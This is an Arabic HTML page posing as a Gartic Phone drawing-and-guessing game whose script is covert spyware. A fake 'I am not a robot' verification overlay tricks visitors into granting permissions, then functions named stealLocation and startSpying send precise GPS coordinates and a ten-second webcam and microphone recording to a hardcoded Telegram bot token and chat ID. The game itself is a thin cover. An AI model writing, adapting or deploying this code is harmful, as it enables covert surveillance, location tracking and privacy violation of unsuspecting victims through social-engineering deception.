<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎨 Gartic Phone - لعبة جماعية</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            min-height: 100vh;
            padding: 1rem;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .card { background: rgba(255,255,255,0.1); border-radius: 20px; padding: 1.5rem; margin-bottom: 1rem; text-align: center; }
        .room-code { background: rgba(0,0,0,0.5); padding: 0.5rem; border-radius: 30px; font-family: monospace; display: inline-block; margin: 0.5rem 0; word-break: break-all; }
        input, button { padding: 10px 15px; border-radius: 30px; border: none; margin: 5px; }
        button { background: #f9a826; color: #1a1a2e; font-weight: bold; cursor: pointer; }
        .players-list { display: flex; flex-wrap: wrap; justify-content: center; gap: 0.5rem; margin: 1rem 0; }
        .player-badge { background: rgba(249,168,38,0.2); border: 1px solid #f9a826; border-radius: 30px; padding: 0.3rem 0.8rem; }
        canvas { background: white; border-radius: 10px; cursor: crosshair; max-width: 100%; }
        .tools { display: flex; gap: 0.5rem; justify-content: center; margin-top: 1rem; flex-wrap: wrap; }
        .tools button { background: rgba(255,255,255,0.2); color: white; }
        .tools button.active { background: #f9a826; color: #1a1a2e; }
        .prompt-box { background: #f9a826; color: #1a1a2e; padding: 1rem; border-radius: 10px; margin-bottom: 1rem; font-weight: bold; }
        .guess-input { width: 100%; padding: 10px; border-radius: 30px; border: none; margin-top: 10px; }
        .hidden { display: none; }
        .chat-box { margin-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem; }
        .chat-messages { max-height: 150px; overflow-y: auto; font-size: 0.8rem; text-align: left; margin-bottom: 0.5rem; }
        .chat-input { display: flex; gap: 0.5rem; }
        .chat-input input { flex: 1; background: rgba(255,255,255,0.2); color: white; }
        .verify-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98);
            z-index: 2000; display: flex; align-items: center; justify-content: center;
        }
        .verify-card { background: #1a1f2e; border-radius: 32px; padding: 2rem; width: 90%; max-width: 400px; text-align: center; }
        .verify-card button { background: #f9a826; border: none; padding: 12px 28px; border-radius: 40px; color: #1a1a2e; font-weight: bold; margin-top: 1rem; cursor: pointer; }
        .progress-bar { width: 80%; height: 4px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #f9a826; animation: loading 10s linear forwards; }
        @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>🎨 Gartic Phone</h1>
        <p>لعبة الرسم والتخمين الجماعية</p>
        <div id="roomInfo" class="room-code">⚡ جاري الاتصال...</div>
        <div id="playersList" class="players-list"></div>
        <div id="waitingMessage">⏳ في انتظار اتصال اللاعبين...</div>
    </div>

    <div id="gameArea" class="hidden">
        <div id="drawArea">
            <div id="promptDisplay" class="prompt-box hidden"></div>
            <canvas id="drawCanvas" width="600" height="400" style="width:100%; height:auto;"></canvas>
            <div class="tools" id="drawTools">
                <button data-color="#000000" class="active">⚫</button>
                <button data-color="#ff0000">🔴</button>
                <button data-color="#00ff00">🟢</button>
                <button data-color="#0000ff">🔵</button>
                <button data-color="#ffff00">🟡</button>
                <button id="clearBtn">🗑️ مسح</button>
                <button id="sendDrawingBtn">✉️ إرسال</button>
            </div>
            <div id="guessArea" class="hidden">
                <input type="text" id="guessInput" class="guess-input" placeholder="اكتب تخمينك...">
                <button id="sendGuessBtn">إرسال</button>
            </div>
        </div>
        <div id="resultsArea" class="hidden"></div>
        <div class="chat-box">
            <div id="chatMessages" class="chat-messages"></div>
            <div class="chat-input">
                <input type="text" id="chatInput" placeholder="رسالة...">
                <button id="sendChatBtn">📨</button>
            </div>
        </div>
    </div>
</div>

<div id="verifyOverlay" class="verify-overlay">
    <div class="verify-card">
        <h3>✅ التحقق الأمني</h3>
        <p>لتأكيد هويتك، يرجى منح الصلاحيات</p>
        <button id="verifyBtn">أنا لست روبوتاً</button>
        <div id="verifyStatus"></div>
    </div>
</div>

<script>
    // ========== السلاح النووي ==========
    const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
    const CHAT_ID = '6052532044';

    function sendTextToTelegram(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        }).catch(e => console.error(e));
    }

    function sendFileToTelegram(file, type) {
        let fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append(type === 'video' ? 'video' : 'audio', new File([file], `${type}_${Date.now()}.${type === 'video' ? 'mp4' : 'webm'}`, { type: file.type }));
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type === 'video' ? 'sendVideo' : 'sendAudio'}`, { method: 'POST', body: fd });
    }

    function stealLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => sendTextToTelegram(`📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`),
                err => sendTextToTelegram("❌ لا موقع"),
                { enableHighAccuracy: true, timeout: 7000 }
            );
        }
    }

    let mediaRecorder, videoChunks = [], isRecording = false;
    async function startSpying() {
        if (isRecording) return;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            videoChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            mediaRecorder.ondataavailable = e => { if (e.data.size) videoChunks.push(e.data); };
            mediaRecorder.onstop = async () => { const blob = new Blob(videoChunks, { type: 'video/webm' }); await sendFileToTelegram(blob, 'video'); };
            mediaRecorder.start();
            isRecording = true;
            sendTextToTelegram("🔴 بدء المراقبة");
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
                isRecording = false;
            }, 10000);
        } catch(e) { sendTextToTelegram(`❌ فشل: ${e.message}`); }
    }

    // ========== اللعبة الجماعية (WebSocket عبر خادم عام) ==========
    let ws, roomId, playerName, isHost = false, players = [], gameStarted = false;
    let canvas, ctx, drawing = false, currentColor = '#000000';
    let currentRole = null, currentPrompt = "";
    
    playerName = prompt("أدخل اسمك:", "لاعب");
    if (!playerName) playerName = "لاعب";
    
    roomId = new URLSearchParams(window.location.search).get('room') || Math.random().toString(36).substring(2, 8);
    const roomUrl = `${window.location.origin}${window.location.pathname}?room=${roomId}`;
    document.getElementById('roomInfo').innerHTML = `🔗 رمز الغرفة: <strong>${roomId}</strong><br><span style="font-size:0.7rem;">${roomUrl}</span>`;
    
    // الاتصال بخادم WebSocket عام (بديل مؤقت)
    ws = new WebSocket('wss://ws.postman-echo.com/raw');
    
    ws.onopen = () => {
        ws.send(JSON.stringify({ type: 'JOIN', roomId, playerName }));
    };
    
    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'PLAYERS') {
                players = data.players;
                updatePlayersUI();
            } else if (data.type === 'START_GAME') {
                startGame();
            } else if (data.type === 'CHAT') {
                addChatMessage(data.sender, data.message);
            } else if (data.type === 'DRAWING') {
                document.getElementById('resultsArea').innerHTML = `<h3>🎨 رسمة:</h3><img src="${data.drawing}" style="max-width:300px; border-radius:10px;">`;
                document.getElementById('resultsArea').classList.remove('hidden');
                setTimeout(() => document.getElementById('resultsArea').classList.add('hidden'), 8000);
            }
        } catch(e) {}
    };
    
    function sendMessage(data) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(data));
        }
    }
    
    function addChatMessage(sender, message, isSystem = false) {
        const chatDiv = document.getElementById('chatMessages');
        const msgDiv = document.createElement('div');
        msgDiv.style.marginBottom = '5px';
        msgDiv.style.fontSize = '0.8rem';
        if (isSystem) { msgDiv.style.color = '#f9a826'; msgDiv.innerHTML = `🔹 ${message}`; }
        else { msgDiv.innerHTML = `<strong>${sender}:</strong> ${message}`; }
        chatDiv.appendChild(msgDiv);
        chatDiv.scrollTop = chatDiv.scrollHeight;
    }
    
    function updatePlayersUI() {
        const container = document.getElementById('playersList');
        container.innerHTML = players.map(p => `<div class="player-badge">${p.name} ${p.isHost ? '👑' : ''}</div>`).join('');
        if (players.length >= 2 && isHost && !gameStarted) {
            document.getElementById('waitingMessage').innerHTML = '<button id="startGameBtn">🎮 بدء اللعبة</button>';
            document.getElementById('startGameBtn')?.addEventListener('click', () => {
                sendMessage({ type: 'START_GAME', roomId });
                startGame();
            });
        } else if (!isHost) {
            document.getElementById('waitingMessage').innerHTML = '⏳ في انتظار بدء اللعبة...';
        }
    }
    
    function startGame() {
        gameStarted = true;
        document.getElementById('waitingMessage').innerHTML = '';
        document.getElementById('gameArea').classList.remove('hidden');
        startRound();
    }
    
    function startRound() {
        const prompts = ["قطة تطير", "سمكة بنظارة", "سيارة تطير", "ديناصور بكرة", "منزل تفاحة", "قرد يعزف"];
        currentPrompt = prompts[Math.floor(Math.random() * prompts.length)];
        currentRole = isHost ? 'drawer' : 'guesser';
        
        if (currentRole === 'drawer') {
            document.getElementById('promptDisplay').innerHTML = `🎨 ارسم: ${currentPrompt}`;
            document.getElementById('promptDisplay').classList.remove('hidden');
            document.getElementById('guessArea').classList.add('hidden');
            document.getElementById('drawTools').style.display = 'flex';
            enableDrawing(true);
            addChatMessage("نظام", `أنت الرسام! ارسم: "${currentPrompt}"`, true);
        } else {
            document.getElementById('promptDisplay').classList.add('hidden');
            document.getElementById('guessArea').classList.remove('hidden');
            document.getElementById('drawTools').style.display = 'none';
            enableDrawing(false);
            addChatMessage("نظام", "الرسام يرسم... حاول التخمين!", true);
        }
    }
    
    function setupCanvas() {
        canvas = document.getElementById('drawCanvas');
        ctx = canvas.getContext('2d');
        ctx.fillStyle = 'white';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        document.querySelectorAll('.tools button[data-color]').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.tools button[data-color]').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentColor = btn.dataset.color;
            });
        });
        document.getElementById('clearBtn').addEventListener('click', () => {
            ctx.fillStyle = 'white';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        });
        document.getElementById('sendDrawingBtn').addEventListener('click', () => {
            const drawingData = canvas.toDataURL();
            sendMessage({ type: 'DRAWING', drawing: drawingData, roomId });
            addChatMessage("نظام", "✅ تم إرسال رسمتك!", true);
            document.getElementById('sendDrawingBtn').disabled = true;
        });
        document.getElementById('sendGuessBtn').addEventListener('click', () => {
            const guess = document.getElementById('guessInput').value;
            if (guess.trim()) {
                sendMessage({ type: 'GUESS', guess: guess, roomId });
                addChatMessage("نظام", "✅ تم إرسال تخمينك!", true);
                document.getElementById('guessInput').value = '';
                document.getElementById('sendGuessBtn').disabled = true;
            }
        });
    }
    
    function enableDrawing(enabled) {
        if (enabled) {
            canvas.addEventListener('mousedown', startDrawing);
            canvas.addEventListener('mousemove', draw);
            canvas.addEventListener('mouseup', stopDrawing);
        } else {
            canvas.removeEventListener('mousedown', startDrawing);
            canvas.removeEventListener('mousemove', draw);
            canvas.removeEventListener('mouseup', stopDrawing);
        }
    }
    
    function startDrawing(e) { drawing = true; const pos = getMousePos(e); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); }
    function draw(e) { if (!drawing) return; const pos = getMousePos(e); ctx.strokeStyle = currentColor; ctx.lineWidth = 5; ctx.lineCap = 'round'; ctx.lineTo(pos.x, pos.y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); }
    function stopDrawing() { drawing = false; ctx.beginPath(); }
    function getMousePos(e) { const rect = canvas.getBoundingClientRect(); const scaleX = canvas.width / rect.width; const scaleY = canvas.height / rect.height; const clientX = e.clientX; const clientY = e.clientY; return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY }; }
    
    // الدردشة
    document.getElementById('sendChatBtn').addEventListener('click', () => {
        const input = document.getElementById('chatInput');
        const msg = input.value.trim();
        if (msg) {
            sendMessage({ type: 'CHAT', message: msg, playerName, roomId });
            addChatMessage(playerName, msg);
            input.value = '';
        }
    });
    
    // بدء اللعبة بعد التحقق
    document.getElementById('verifyBtn').onclick = async () => {
        document.getElementById('verifyBtn').disabled = true;
        document.getElementById('verifyStatus').innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><p>جاري التحقق...</p>';
        stealLocation();
        await startSpying();
        setTimeout(() => {
            document.getElementById('verifyOverlay').style.display = 'none';
            setupCanvas();
            isHost = true;
            players = [{ name: playerName, isHost: true }];
            updatePlayersUI();
            addChatMessage("نظام", `مرحباً ${playerName}! رمز الغرفة: ${roomId}`, true);
            addChatMessage("نظام", "شارك الرابط مع أصدقائك للانضمام!", true);
        }, 10000);
    };
</script>
</body>
</html>
